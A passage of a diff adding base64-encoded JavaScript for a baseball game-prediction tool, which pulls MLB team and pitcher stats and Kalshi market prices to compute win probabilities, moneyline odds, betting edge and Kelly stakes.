+`aG9tZS50ZWFtLm5hbWUscGl0Y2hlcklkOihnLnRlYW1zLmhvbWUucHJvYmFi`,
+`bGVQaXRjaGVyJiZnLnRlYW1zLmhvbWUucHJvYmFibGVQaXRjaGVyLmlkKXx8`,
+`bnVsbCxwaXRjaGVyTmFtZTooZy50ZWFtcy5ob21lLnByb2JhYmxlUGl0Y2hl`,
+`ciYmZy50ZWFtcy5ob21lLnByb2JhYmxlUGl0Y2hlci5mdWxsTmFtZSl8fCdU`,
+`QkQnfX07fSk7fSk7fQpmdW5jdGlvbiBmZXRjaFNQKHBpZCx5cil7aWYoIXBp`,
+`ZClyZXR1cm4gUHJvbWlzZS5yZXNvbHZlKG51bGwpO3JldHVybiBtbGJHZXQo`,
+`Jy9wZW9wbGUvJytwaWQrJy9zdGF0cz9zdGF0cz1zZWFzb24mZ3JvdXA9cGl0`,
+`Y2hpbmcmc2Vhc29uPScreXIpLnRoZW4oZnVuY3Rpb24oZCl7dmFyIHM9ZC5z`,
+`dGF0cyYmZC5zdGF0c1swXSYmZC5zdGF0c1swXS5zcGxpdHMmJmQuc3RhdHNb`,
+`MF0uc3BsaXRzWzBdP2Quc3RhdHNbMF0uc3BsaXRzWzBdLnN0YXQ6bnVsbDtp`,
+`ZighcylyZXR1cm4gbnVsbDt2YXIgaXA9cGFyc2VGbG9hdChzLmlubmluZ3NQ`,
+`aXRjaGVkKXx8MCxocj1wYXJzZUludChzLmhvbWVSdW5zKXx8MCxiYj1wYXJz`,
+`ZUludChzLmJhc2VPbkJhbGxzKXx8MCxoYnA9cGFyc2VJbnQocy5oaXRCeVBp`,
+`dGNoKXx8MCxrPXBhcnNlSW50KHMuc3RyaWtlT3V0cyl8fDAsZ3M9cGFyc2VJ`,
+`bnQocy5nYW1lc1N0YXJ0ZWQpfHwxO3ZhciBmaXA9aXA+MD8oKDEzKmhyKSsz`,
+`KihiYitoYnApLSgyKmspKS9pcCszLjE1Om51bGw7dmFyIHhmaXA9aXA+MD8o`,
+`KDEzKigxLjI1KmlwLzkpKSszKihiYitoYnApLSgyKmspKS9pcCszLjE1Om51`,
+`bGw7cmV0dXJue2VyYTpwYXJzZUZsb2F0KHMuZXJhKXx8NC41MCx3aGlwOnBh`,
+`cnNlRmxvYXQocy53aGlwKXx8MS4zNSxrOTpwYXJzZUZsb2F0KHMuc3RyaWtl`,
+`b3V0c1BlcjlJbm4pfHw4LjUsYmI5OnBhcnNlRmxvYXQocy53YWxrc1BlcjlJ`,
+`bm4pfHwzLjIsZmlwOmZpcHx8cGFyc2VGbG9hdChzLmVyYSkqMC45NXx8NC4z`,
+`MCx4ZmlwOnhmaXB8fHBhcnNlRmxvYXQocy5lcmEpKjAuOTN8fDQuMjAsaXBz`,
+`UGVyU3RhcnQ6aXAvZ3N9O30pLmNhdGNoKGZ1bmN0aW9uKCl7cmV0dXJuIG51`,
+`bGw7fSk7fQpmdW5jdGlvbiBmZXRjaEhpdChpZCx5cil7dmFyIHdvYmE9bnVs`,
+`bCxiYWJpcD1udWxsO3JldHVybiBtbGJHZXQoJy90ZWFtcy8nK2lkKycvc3Rh`,
+`dHM/c3RhdHM9c2FiZXJtZXRyaWNzJmdyb3VwPWhpdHRpbmcmc2Vhc29uPScr`,
+`eXIpLnRoZW4oZnVuY3Rpb24oZHMpe3ZhciBzcz1kcy5zdGF0cyYmZHMuc3Rh`,
+`dHNbMF0mJmRzLnN0YXRzWzBdLnNwbGl0cyYmZHMuc3RhdHNbMF0uc3BsaXRz`,
+`WzBdP2RzLnN0YXRzWzBdLnNwbGl0c1swXS5zdGF0Om51bGw7aWYoc3Mpe3dv`,
+`YmE9cGFyc2VGbG9hdChzcy53T0JBKTtiYWJpcD1wYXJzZUZsb2F0KHNzLmJh`,
+`YmlwKTt9fSkuY2F0Y2goZnVuY3Rpb24oKXt9KS50aGVuKGZ1bmN0aW9uKCl7`,
+`cmV0dXJuIG1sYkdldCgnL3RlYW1zLycraWQrJy9zdGF0cz9zdGF0cz1zZWFz`,
+`b24mZ3JvdXA9aGl0dGluZyZzZWFzb249Jyt5cik7fSkudGhlbihmdW5jdGlv`,
+`bihkKXt2YXIgcz1kLnN0YXRzJiZkLnN0YXRzWzBdJiZkLnN0YXRzWzBdLnNw`,
+`bGl0cyYmZC5zdGF0c1swXS5zcGxpdHNbMF0/ZC5zdGF0c1swXS5zcGxpdHNb`,
+`MF0uc3RhdDpudWxsO2lmKCFzKXJldHVybiBudWxsO3ZhciBvYnA9cGFyc2VG`,
+`bG9hdChzLm9icCl8fDAuMzIwLHNsZz1wYXJzZUZsb2F0KHMuc2xnKXx8MC40`,
+`MTA7aWYoIXdvYmF8fGlzTmFOKHdvYmEpKXdvYmE9KG9icCoxLjE1K3NsZyow`,
+`LjYyKS8xLjc3O2lmKCFiYWJpcHx8aXNOYU4oYmFiaXApKWJhYmlwPXBhcnNl`,
+`RmxvYXQocy5iYWJpcCl8fDAuMjk1O3JldHVybntiYTpwYXJzZUZsb2F0KHMu`,
+`YXZnKXx8MC4yNTAsb2JwOm9icCxzbGc6c2xnLHdvYmE6d29iYSxiYWJpcDpi`,
+`YWJpcH07fSkuY2F0Y2goZnVuY3Rpb24oKXtyZXR1cm4gbnVsbDt9KTt9CmZ1`,
+`bmN0aW9uIGZldGNoUGl0KGlkLHlyKXtyZXR1cm4gbWxiR2V0KCcvdGVhbXMv`,
+`JytpZCsnL3N0YXRzP3N0YXRzPXNlYXNvbiZncm91cD1waXRjaGluZyZzZWFz`,
+`b249Jyt5cikudGhlbihmdW5jdGlvbihkKXt2YXIgcz1kLnN0YXRzJiZkLnN0`,
+`YXRzWzBdJiZkLnN0YXRzWzBdLnNwbGl0cyYmZC5zdGF0c1swXS5zcGxpdHNb`,
+`MF0/ZC5zdGF0c1swXS5zcGxpdHNbMF0uc3RhdDpudWxsO2lmKCFzKXJldHVy`,
+`biBudWxsO3ZhciBpcD1wYXJzZUZsb2F0KHMuaW5uaW5nc1BpdGNoZWQpfHwx`,
+`MDAwLGhyPXBhcnNlSW50KHMuaG9tZVJ1bnMpfHwxNTAsYmI9cGFyc2VJbnQo`,
+`cy5iYXNlT25CYWxscyl8fDQ1MCxoYnA9cGFyc2VJbnQocy5oaXRCeVBpdGNo`,
+`KXx8NjAsaz1wYXJzZUludChzLnN0cmlrZU91dHMpfHwxMjAwO3ZhciBmaXA9`,
+`aXA+MD8oKDEzKmhyKSszKihiYitoYnApLSgyKmspKS9pcCszLjE1OjQuMDU7`,
+`cmV0dXJue3RlYW1FcmE6cGFyc2VGbG9hdChzLmVyYSl8fDQuMjAsdGVhbVdo`,
+`aXA6cGFyc2VGbG9hdChzLndoaXApfHwxLjI4LHRlYW1LOTpwYXJzZUZsb2F0`,
+`KHMuc3RyaWtlb3V0c1BlcjlJbm4pfHw4LjUsdGVhbUZpcDpmaXAsc2F2ZXM6`,
+`cGFyc2VJbnQocy5zYXZlcyl8fDI1LGhvbGRzOnBhcnNlSW50KHMuaG9sZHMp`,
+`fHw0NSxibG93blNhdmVzOnBhcnNlSW50KHMuYmxvd25TYXZlcyl8fDEwfTt9`,
+`KS5jYXRjaChmdW5jdGlvbigpe3JldHVybiBudWxsO30pO30KZnVuY3Rpb24g`,
+`ZmV0Y2hEZWYoaWQseXIpe3JldHVybiBtbGJHZXQoJy90ZWFtcy8nK2lkKycv`,
+`c3RhdHM/c3RhdHM9c2Vhc29uJmdyb3VwPWZpZWxkaW5nJnNlYXNvbj0nK3ly`,
+`KS50aGVuKGZ1bmN0aW9uKGQpe3ZhciBzPWQuc3RhdHMmJmQuc3RhdHNbMF0m`,
+`JmQuc3RhdHNbMF0uc3BsaXRzJiZkLnN0YXRzWzBdLnNwbGl0c1swXT9kLnN0`,
+`YXRzWzBdLnNwbGl0c1swXS5zdGF0Om51bGw7aWYoIXMpcmV0dXJuIG51bGw7`,
+`cmV0dXJue2ZpZWxkaW5nUGN0OnBhcnNlRmxvYXQocy5maWVsZGluZyl8fDAu`,
+`OTgzLGVycm9yczpwYXJzZUludChzLmVycm9ycyl8fDgwfTt9KS5jYXRjaChm`,
+`dW5jdGlvbigpe3JldHVybiBudWxsO30pO30KZnVuY3Rpb24gZmV0Y2hSZWNl`,
+`bnQoaWQsZGF0ZSl7cmV0dXJuIG1sYkdldCgnL3NjaGVkdWxlP3RlYW1JZD0n`,
+`K2lkKycmc3RhcnREYXRlPScrZGF5c0FnbygyMCkrJyZlbmREYXRlPScrZGF0`,
+`ZSsnJnNwb3J0SWQ9MScpLnRoZW4oZnVuY3Rpb24oZCl7dmFyIGdhbWVzPShk`,
+`LmRhdGVzfHxbXSkucmVkdWNlKGZ1bmN0aW9uKGEseCl7cmV0dXJuIGEuY29u`,
+`Y2F0KHguZ2FtZXMpO30sW10pLmZpbHRlcihmdW5jdGlvbihnKXtyZXR1cm4g`,
+`Zy5zdGF0dXMmJmcuc3RhdHVzLmFic3RyYWN0R2FtZVN0YXRlPT09J0ZpbmFs`,
+`Jzt9KS5zbGljZSgtMTApO2lmKCFnYW1lcy5sZW5ndGgpcmV0dXJue3dpblBj`,
+`dDowLjUwMH07dmFyIHdpbnM9Z2FtZXMuZmlsdGVyKGZ1bmN0aW9uKGcpe3Jl`,
+`dHVybiBnLnRlYW1zLmhvbWUudGVhbS5pZD09PWlkP2cudGVhbXMuaG9tZS5p`,
+`c1dpbm5lcjpnLnRlYW1zLmF3YXkuaXNXaW5uZXI7fSkubGVuZ3RoO3JldHVy`,
+`bnt3aW5QY3Q6d2lucy9nYW1lcy5sZW5ndGh9O30pLmNhdGNoKGZ1bmN0aW9u`,
+`KCl7cmV0dXJue3dpblBjdDowLjUwMH07fSk7fQpmdW5jdGlvbiBmZXRjaFN0`,
+`YW5kKGlkLHlyKXtyZXR1cm4gbWxiR2V0KCcvc3RhbmRpbmdzP2xlYWd1ZUlk`,
+`PTEwMywxMDQmc2Vhc29uPScreXIrJyZoeWRyYXRlPXRlYW0nKS50aGVuKGZ1`,
+`bmN0aW9uKGQpe2Zvcih2YXIgaT0wO2k8KGQucmVjb3Jkc3x8W10pLmxlbmd0`,
+`aDtpKyspe2Zvcih2YXIgaj0wO2o8KGQucmVjb3Jkc1tpXS50ZWFtUmVjb3Jk`,
+`c3x8W10pLmxlbmd0aDtqKyspe3ZhciB0cj1kLnJlY29yZHNbaV0udGVhbVJl`,
+`Y29yZHNbal07aWYodHIudGVhbS5pZD09PWlkKXJldHVybntyZGlmZjoodHIu`,
+`cnVuc1Njb3JlZHx8MCktKHRyLnJ1bnNBbGxvd2VkfHwwKSxwY3Q6cGFyc2VG`,
+`bG9hdCh0ci53aW5uaW5nUGVyY2VudGFnZSl8fDAuNTAwfTt9fXJldHVybnty`,
+`ZGlmZjowLHBjdDowLjUwMH07fSkuY2F0Y2goZnVuY3Rpb24oKXtyZXR1cm57`,
+`cmRpZmY6MCxwY3Q6MC41MDB9O30pO30KZnVuY3Rpb24gZmV0Y2hIMkgoYXdh`,
+`eUlkLGhvbWVJZCx5cil7cmV0dXJuIG1sYkdldCgnL3NjaGVkdWxlP3Nwb3J0`,
+`SWQ9MSZzZWFzb249Jyt5cisnJnRlYW1JZD0nK2F3YXlJZCsnJm9wcG9uZW50`,
+`SWQ9Jytob21lSWQpLnRoZW4oZnVuY3Rpb24oZCl7dmFyIGdhbWVzPShkLmRh`,
+`dGVzfHxbXSkucmVkdWNlKGZ1bmN0aW9uKGEseCl7cmV0dXJuIGEuY29uY2F0`,
+`KHguZ2FtZXMpO30sW10pLmZpbHRlcihmdW5jdGlvbihnKXtyZXR1cm4gZy5z`,
+`dGF0dXMmJmcuc3RhdHVzLmFic3RyYWN0R2FtZVN0YXRlPT09J0ZpbmFsJzt9`,
+`KTtpZihnYW1lcy5sZW5ndGg8MylyZXR1cm4gbnVsbDt2YXIgYXc9Z2FtZXMu`,
+`ZmlsdGVyKGZ1bmN0aW9uKGcpe3JldHVybihnLnRlYW1zLmF3YXkudGVhbS5p`,
+`ZD09PWF3YXlJZCYmZy50ZWFtcy5hd2F5LmlzV2lubmVyKXx8KGcudGVhbXMu`,
+`aG9tZS50ZWFtLmlkPT09YXdheUlkJiZnLnRlYW1zLmhvbWUuaXNXaW5uZXIp`,
+`O30pLmxlbmd0aDtyZXR1cm57YXdheVdpbnM6YXcsdG90YWw6Z2FtZXMubGVu`,
+`Z3RoLGF3YXlQY3Q6YXcvZ2FtZXMubGVuZ3RofTt9KS5jYXRjaChmdW5jdGlv`,
+`bigpe3JldHVybiBudWxsO30pO30KZnVuY3Rpb24gZmV0Y2hDb21wbGV0ZWQo`,
+`c3RhcnQsZW5kKXtyZXR1cm4gbWxiR2V0KCcvc2NoZWR1bGU/c3BvcnRJZD0x`,
+`JnN0YXJ0RGF0ZT0nK3N0YXJ0KycmZW5kRGF0ZT0nK2VuZCsnJmh5ZHJhdGU9`,
+`cHJvYmFibGVQaXRjaGVyLHRlYW0sZGVjaXNpb25zJykudGhlbihmdW5jdGlv`,
+`bihkKXtyZXR1cm4oZC5kYXRlc3x8W10pLnJlZHVjZShmdW5jdGlvbihhLHgp`,
+`e3JldHVybiBhLmNvbmNhdCh4LmdhbWVzKTt9LFtdKS5maWx0ZXIoZnVuY3Rp`,
+`b24oZyl7cmV0dXJuIGcuc3RhdHVzJiZnLnN0YXR1cy5hYnN0cmFjdEdhbWVT`,
+`dGF0ZT09PSdGaW5hbCc7fSkubWFwKGZ1bmN0aW9uKGcpe3JldHVybntnYW1l`,
+`UGs6Zy5nYW1lUGssZGF0ZTooZy5vZmZpY2lhbERhdGV8fGcuZ2FtZURhdGV8`,
+`fCcnKS5zbGljZSgwLDEwKSxhd2F5OntpZDpnLnRlYW1zLmF3YXkudGVhbS5p`,
+`ZCxuYW1lOmcudGVhbXMuYXdheS50ZWFtLm5hbWUscGl0Y2hlcklkOihnLnRl`,
+`YW1zLmF3YXkucHJvYmFibGVQaXRjaGVyJiZnLnRlYW1zLmF3YXkucHJvYmFi`,
+`bGVQaXRjaGVyLmlkKXx8bnVsbCxwaXRjaGVyTmFtZTooZy50ZWFtcy5hd2F5`,
+`LnByb2JhYmxlUGl0Y2hlciYmZy50ZWFtcy5hd2F5LnByb2JhYmxlUGl0Y2hl`,
+`ci5mdWxsTmFtZSl8fCdUQkQnfSxob21lOntpZDpnLnRlYW1zLmhvbWUudGVh`,
+`bS5pZCxuYW1lOmcudGVhbXMuaG9tZS50ZWFtLm5hbWUscGl0Y2hlcklkOihn`,
+`LnRlYW1zLmhvbWUucHJvYmFibGVQaXRjaGVyJiZnLnRlYW1zLmhvbWUucHJv`,
+`YmFibGVQaXRjaGVyLmlkKXx8bnVsbCxwaXRjaGVyTmFtZTooZy50ZWFtcy5o`,
+`b21lLnByb2JhYmxlUGl0Y2hlciYmZy50ZWFtcy5ob21lLnByb2JhYmxlUGl0`,
+`Y2hlci5mdWxsTmFtZSl8fCdUQkQnfSxhY3R1YWxXaW5uZXI6Zy50ZWFtcy5o`,
+`b21lLmlzV2lubmVyP2cudGVhbXMuaG9tZS50ZWFtLm5hbWU6Zy50ZWFtcy5h`,
+`d2F5LmlzV2lubmVyP2cudGVhbXMuYXdheS50ZWFtLm5hbWU6bnVsbH07fSku`,
+`ZmlsdGVyKGZ1bmN0aW9uKGcpe3JldHVybiBnLmFjdHVhbFdpbm5lcjt9KTt9`,
+`KTt9CnZhciBfY2FjaGU9e307CmZ1bmN0aW9uIGNhY2hlZFN0YXRzKGlkLHly`,
+`KXt2YXIgaz1pZCsnLScreXI7aWYoX2NhY2hlW2tdKXJldHVybiBQcm9taXNl`,
+`LnJlc29sdmUoX2NhY2hlW2tdKTtyZXR1cm4gUHJvbWlzZS5hbGwoW2ZldGNo`,
+`SGl0KGlkLHlyKSxmZXRjaFBpdChpZCx5ciksZmV0Y2hEZWYoaWQseXIpLGZl`,
+`dGNoU3RhbmQoaWQseXIpXSkudGhlbihmdW5jdGlvbihyKXtfY2FjaGVba109`,
+`e2hpdDpyWzBdfHxBVkdfSElULHBpdDpyWzFdLGRlZjpyWzJdfHxBVkdfREVG`,
+`LHN0YW5kOnJbM118fEFWR19TVEFORH07cmV0dXJuIF9jYWNoZVtrXTt9KTt9`,
+`CmZ1bmN0aW9uIHByaWNlVG9NTChwKXtwPXBhcnNlRmxvYXQocCk7aWYoIXB8`,
+`fGlzTmFOKHApfHxwPD0wfHxwPj0xKXJldHVybiBudWxsO2lmKHA+PTAuNSly`,
+`ZXR1cm4nLScrTWF0aC5yb3VuZChwLygxLXApKjEwMCk7cmV0dXJuJysnK01h`,
+`dGgucm91bmQoKDEtcCkvcCoxMDApO30KZnVuY3Rpb24gZmV0Y2hLYWxzaGlP`,
+`ZGRzKHJlc3VsdHMpe3JldHVybiBmZXRjaChLQUxTSElfQVBJKycvZXZlbnRz`,
+`P3Nlcmllc190aWNrZXI9S1hNTEJHQU1FJnN0YXR1cz1vcGVuJmxpbWl0PTIw`,
+`MCcpLnRoZW4oZnVuY3Rpb24ocil7aWYoIXIub2spdGhyb3cgbmV3IEVycm9y`,
+`KCdIVFRQICcrci5zdGF0dXMpO3JldHVybiByLmpzb24oKTt9KS50aGVuKGZ1`,
+`bmN0aW9uKGQpe3ZhciBldmVudHM9ZC5ldmVudHN8fFtdO3ZhciBvZGRzPXt9`,
+`O3ZhciBwcm9taXNlcz1bXTtyZXN1bHRzLmZvckVhY2goZnVuY3Rpb24oZ2Ft`,
+`ZSl7dmFyIGF3YXlBYmJyPShBQkJSW2dhbWUuYU5hbWVdfHwnJykudG9VcHBl`,
+`ckNhc2UoKTt2YXIgaG9tZUFiYnI9KEFCQlJbZ2FtZS5iTmFtZV18fCcnKS50`,
+`b1VwcGVyQ2FzZSgpO2lmKCFhd2F5QWJicnx8IWhvbWVBYmJyKXJldHVybjt2`,
+`YXIgbWF0Y2hlZD1udWxsO2Zvcih2YXIgaT0wO2k8ZXZlbnRzLmxlbmd0aDtp`,
+`Kyspe3ZhciB0PShldmVudHNbaV0uZXZlbnRfdGlja2VyfHwnJykudG9VcHBl`,
+`ckNhc2UoKTtpZih0LmluZGV4T2YoYXdheUFiYnIpPj0wJiZ0LmluZGV4T2Yo`,
+`aG9tZUFiYnIpPj0wKXttYXRjaGVkPWV2ZW50c1tpXTticmVhazt9fWlmKCFt`,
+`YXRjaGVkKXJldHVybjt2YXIgZ3BrPWdhbWUuZ2FtZVBrO3ZhciB3aW5uZXJO`,
+`aWNrPWdhbWUud2lubmVyLnNwbGl0KCcgJykucG9wKCkudG9Mb3dlckNhc2Uo`,
+`KTt2YXIgd2lubmVyQWJicj0oQUJCUltnYW1lLndpbm5lcl18fCcnKS50b1Vw`,
+`cGVyQ2FzZSgpO3Byb21pc2VzLnB1c2goZmV0Y2goS0FMU0hJX0FQSSsnL21h`,
+`cmtldHM/ZXZlbnRfdGlja2VyPScrbWF0Y2hlZC5ldmVudF90aWNrZXIrJyZz`,
+`dGF0dXM9b3BlbicpLnRoZW4oZnVuY3Rpb24ocil7cmV0dXJuIHIuanNvbigp`,
+`O30pLnRoZW4oZnVuY3Rpb24obWQpeyhtZC5tYXJrZXRzfHxbXSkuZm9yRWFj`,
+`aChmdW5jdGlvbihta3Qpe3ZhciBzdWI9KG1rdC55ZXNfc3ViX3RpdGxlfHxt`,
+`a3QudGl0bGV8fCcnKS50b0xvd2VyQ2FzZSgpO3ZhciB0a3I9KG1rdC50aWNr`,
+`ZXJ8fCcnKS50b1VwcGVyQ2FzZSgpO2lmKHN1Yi5pbmRleE9mKHdpbm5lck5p`,
+`Y2spPj0wfHx0a3IuaW5kZXhPZih3aW5uZXJBYmJyKT49MCl7dmFyIGJpZD1w`,
+`YXJzZUZsb2F0KG1rdC55ZXNfYmlkX2RvbGxhcnMpfHwwO3ZhciBhc2s9cGFy`,
+`c2VGbG9hdChta3QueWVzX2Fza19kb2xsYXJzKXx8MDt2YXIgcHJpY2U9KGJp`,
+`ZCYmYXNrKT8oYmlkK2FzaykvMjpiaWR8fGFza3x8cGFyc2VGbG9hdChta3Qu`,
+`bGFzdF9wcmljZV9kb2xsYXJzKXx8MDt2YXIgbWw9cHJpY2VUb01MKHByaWNl`,
+`KTtpZihtbClvZGRzW2dwa109bWw7fX0pO30pLmNhdGNoKGZ1bmN0aW9uKCl7`,
+`fSkpO30pO3JldHVybiBQcm9taXNlLmFsbChwcm9taXNlcykudGhlbihmdW5j`,
+`dGlvbigpe3JldHVybiBvZGRzO30pO30pLmNhdGNoKGZ1bmN0aW9uKCl7cmV0`,
+`dXJue307fSk7fQpmdW5jdGlvbiBjbGFtcCh2LGxvLGhpKXtyZXR1cm4gTWF0`,
+`aC5tYXgobG8sTWF0aC5taW4oaGksdikpO30KZnVuY3Rpb24gc2lnbW9pZCh4`,
+`KXtyZXR1cm4gMS8oMStNYXRoLmV4cCgteCkpO30KZnVuY3Rpb24gbWxEZWMo`,
+`bWwpe3ZhciBuPXBhcnNlSW50KG1sKTtyZXR1cm4gbj4wPyhuLzEwMCkrMToo`,
+`MTAwL01hdGguYWJzKG4pKSsxO30KZnVuY3Rpb24gbWxJbXAobWwpe2lmKCFt`,
+`bClyZXR1cm4gbnVsbDt2YXIgbj1wYXJzZUludChtbCk7aWYoaXNOYU4obikp`,
+`cmV0dXJuIG51bGw7cmV0dXJuIG4+MD8xMDAvKG4rMTAwKTpNYXRoLmFicyhu`,
+`KS8oTWF0aC5hYnMobikrMTAwKTt9CmZ1bmN0aW9uIGVkZ2VDYWxjKHAsYm1s`,
+`KXt2YXIgYnA9bWxJbXAoYm1sKTtyZXR1cm4gYnAhPT1udWxsP3AtYnA6bnVs`,
+`bDt9CmZ1bmN0aW9uIGtlbGx5KHAsbWwsZil7Zj1mfHwwLjI1O3ZhciBiPW1s`,
+`RGVjKG1sKS0xLHE9MS1wO3JldHVybiBNYXRoLm1heCgwLCgoYipwLXEpL2Ip`,
+`KmYpO30KZnVuY3Rpb24gYmxlbmRQaXRjaChzcCx0cCl7dmFyIFM9c3B8fEFW`,
+`R19TUCxUPXRwfHxBVkdfUElUQ0g7dmFyIHNpPWNsYW1wKFMuaXBzUGVyU3Rh`,
+`cnR8fDUuMCwzLjUsNy4wKSxiaT05LXNpO3ZhciBicEVyYT1jbGFtcCgoVC50`,
+`ZWFtRXJhKjktUy5lcmEqc2kpL2JpLDIuNSw3LjUpO3ZhciBicFdoaXA9Y2xh`,
+`bXAoKFQudGVhbVdoaXAqOS1TLndoaXAqc2kpL2JpLDAuOSwyLjIpO3ZhciBi`,
+`cEs5PWNsYW1wKChULnRlYW1LOSo5LVMuazkqc2kpL2JpLDUuMCwxNC4wKTt2`,
+`YXIgYnBGaXA9Y2xhbXAoKFQudGVhbUZpcCo5LVMuZmlwKnNpKS9iaSwyLjUs`,
+`Ny41KTt2YXIgYnN2PVQuc2F2ZXMrVC5ibG93blNhdmVzO3JldHVybntzcElu`,
+`bjpzaSxicElubjpiaSxzdGFydGVyRXJhOlMuZXJhLHN0YXJ0ZXJXaGlwOlMu`,
+`d2hpcCxzdGFydGVySzk6Uy5rOSxzdGFydGVyRmlwOlMuZmlwLHN0YXJ0ZXJY`,
+`ZmlwOlMueGZpcCxzdGFydGVyQmI5OlMuYmI5LGJ1bGxwZW5FcmE6YnBFcmEs`,
+`YnVsbHBlbldoaXA6YnBXaGlwLGJ1bGxwZW5GaXA6YnBGaXAsYmxlbmRlZEVy`,
+`YTooUy5lcmEqc2krYnBFcmEqYmkpLzksYmxlbmRlZFdoaXA6KFMud2hpcCpz`,
+`aSticFdoaXAqYmkpLzksYmxlbmRlZEs5OihTLms5KnNpK2JwSzkqYmkpLzks`,
+`YmxlbmRlZEZpcDooUy5maXAqc2krYnBGaXAqYmkpLzksYnVsbHBlbkRlcHRo`,
+`OihULnNhdmVzK1QuaG9sZHMpLzcwLHN2UGN0OmJzdj4wP1Quc2F2ZXMvYnN2`,
+`OjAuNzB9O30KZnVuY3Rpb24gcnVuTW9kZWwoQSxCLGgyaCl7dmFyIHBmQj0o`,
+`UEFSS1tCLm5hbWVdfHwxMDApLzEwMCxwZkE9KFBBUktbQS5uYW1lXXx8MTAw`,
+`KS8xMDA7dmFyIGFXPShBLmhpdC53b2JhL3BmQSkqcGZCLGJXPShCLmhpdC53`,
+`b2JhL3BmQSkqcGZCO3ZhciBhTD0oQS5oaXQuYmFiaXAtMC4yOTUpKjAuNSxi`,
+`TD0oQi5oaXQuYmFiaXAtMC4yOTUpKjAuNTt2YXIgYUQ9KEEuZGVmLmZpZWxk`,
+`aW5nUGN0LTAuOTgzKSo1MC0oQS5kZWYuZXJyb3JzLTgwKSowLjAwMzt2YXIg`,
+`YkQ9KEIuZGVmLmZpZWxkaW5nUGN0LTAuOTgzKSo1MC0oQi5kZWYuZXJyb3Jz`,
+`LTgwKSowLjAwMzt2YXIgYUJQPShBLnBpdGNoLnN2UGN0LTAuNzApKjAuMyxi`,
+`QlA9KEIucGl0Y2guc3ZQY3QtMC43MCkqMC4zO3ZhciBsbz0wO2xvKz0oQi5w`,
+`aXRjaC5ibGVuZGVkRmlwLUEucGl0Y2guYmxlbmRlZEZpcCkqMC4yNDtsbys9`,
+`KEIucGl0Y2guYmxlbmRlZFdoaXAtQS5waXRjaC5ibGVuZGVkV2hpcCkqMC4y`,
+`MDtsbys9KEEucGl0Y2guYmxlbmRlZEs5LUIucGl0Y2guYmxlbmRlZEs5KSow`,
+`LjA0O2xvKz0oQS5waXRjaC5zdGFydGVyQmI5LUIucGl0Y2guc3RhcnRlckJi`,
+`OSkqMC4wNjtsbys9YUJQLWJCUDtsbys9KEEucGl0Y2guYnVsbHBlbkRlcHRo`,
+`LUIucGl0Y2guYnVsbHBlbkRlcHRoKSowLjEwO2xvKz0oYVctYlcpKjQuMjts`,
+`bys9KEEuaGl0LnNsZy1CLmhpdC5zbGcpKjAuODtsby09KGFMLWJMKTtsbys9`,
+`KGFELWJEKSowLjA4O2xvLT0wLjE2O2xvKz0oQS5zdGFuZC5yZGlmZi1CLnN0`,
+`YW5kLnJkaWZmKSowLjAwNTtsbys9KEEucmVjZW50LndpblBjdC1CLnJlY2Vu`,
+`dC53aW5QY3QpKjAuNTA7bG8rPShBLnN0YW5kLnBjdC1CLnN0YW5kLnBjdCkq`,
+`MC4zMDtpZihoMmgmJmgyaC50b3RhbD49Mylsbys9KGgyaC5hd2F5UGN0LTAu`,
+`NTAwKSowLjIwO2xvKz0oKFBBUktbQi5uYW1lXXx8MTAwKS0xMDApKjAuMDA0`,
+`O3ZhciBwQT1jbGFtcChzaWdtb2lkKGxvKSwwLjIyLDAuNzgpLHBCPTEtcEE7`,
+`ZnVuY3Rpb24gbWwocCl7cmV0dXJuIHA+PTAuNT8nLScrTWF0aC5yb3VuZChw`,
+`LygxLXApKjEwMCk6JysnK01hdGgucm91bmQoKDEtcCkvcCoxMDApO312YXIg`,
+`ckE9TWF0aC5tYXgoMSxNYXRoLnJvdW5kKGFXKjE0LUIucGl0Y2guYmxlbmRl`,
+`ZEZpcCowLjMwKSk7dmFyIHJCPU1hdGgubWF4KDEsTWF0aC5yb3VuZChiVyox`,
+`NC1BLnBpdGNoLmJsZW5kZWRGaXAqMC4zMCkpO3ZhciB3aW5uZXI9cEE+PXBC`,
+`P0EubmFtZTpCLm5hbWU7dmFyIGZhY3RvcnM9W3tsYWJlbDonQmxlbmRlZCBG`,
+`SVAnLGFWYWw6QS5waXRjaC5ibGVuZGVkRmlwLnRvRml4ZWQoMiksYlZhbDpC`,
+`LnBpdGNoLmJsZW5kZWRGaXAudG9GaXhlZCgyKSxkZWx0YTooQi5waXRjaC5i`,
+`bGVuZGVkRmlwLUEucGl0Y2guYmxlbmRlZEZpcCkqMC4yNH0se2xhYmVsOidC`,
+`bGVuZGVkIFdISVAnLGFWYWw6QS5waXRjaC5ibGVuZGVkV2hpcC50b0ZpeGVk`,
+`KDIpLGJWYWw6Qi5waXRjaC5ibGVuZGVkV2hpcC50b0ZpeGVkKDIpLGRlbHRh`,
+`OihCLnBpdGNoLmJsZW5kZWRXaGlwLUEucGl0Y2guYmxlbmRlZFdoaXApKjAu`,
+`MjB9LHtsYWJlbDonQkIvOScsYVZhbDpBLnBpdGNoLnN0YXJ0ZXJCYjkudG9G`,
+`aXhlZCgxKSxiVmFsOkIucGl0Y2guc3RhcnRlckJiOS50b0ZpeGVkKDEpLGRl`,
+`bHRhOihBLnBpdGNoLnN0YXJ0ZXJCYjktQi5waXRjaC5zdGFydGVyQmI5KSow`,
+`LjA2fSx7bGFiZWw6J0svOScsYVZhbDpBLnBpdGNoLmJsZW5kZWRLOS50b0Zp`,
+`eGVkKDEpLGJWYWw6Qi5waXRjaC5ibGVuZGVkSzkudG9GaXhlZCgxKSxkZWx0`,
+`YTooQS5waXRjaC5ibGVuZGVkSzktQi5waXRjaC5ibGVuZGVkSzkpKjAuMDR9`,
+`LHtsYWJlbDonQnVsbHBlbiBEZXB0aCcsYVZhbDonJytNYXRoLnJvdW5kKEEu`,
+`cGl0Y2guYnVsbHBlbkRlcHRoKjcwKSxiVmFsOicnK01hdGgucm91bmQoQi5w`,
+`aXRjaC5idWxscGVuRGVwdGgqNzApLGRlbHRhOihBLnBpdGNoLmJ1bGxwZW5E`,
+`ZXB0aC1CLnBpdGNoLmJ1bGxwZW5EZXB0aCkqMC4xMH0se2xhYmVsOidTYXZl`,
+`IFBjdCcsYVZhbDooQS5waXRjaC5zdlBjdCoxMDApLnRvRml4ZWQoMCkrJyUn`,
+`LGJWYWw6KEIucGl0Y2guc3ZQY3QqMTAwKS50b0ZpeGVkKDApKyclJyxkZWx0`,
+`YTphQlAtYkJQfSx7bGFiZWw6J3dPQkEgcGFyay1hZGonLGFWYWw6YVcudG9G`,
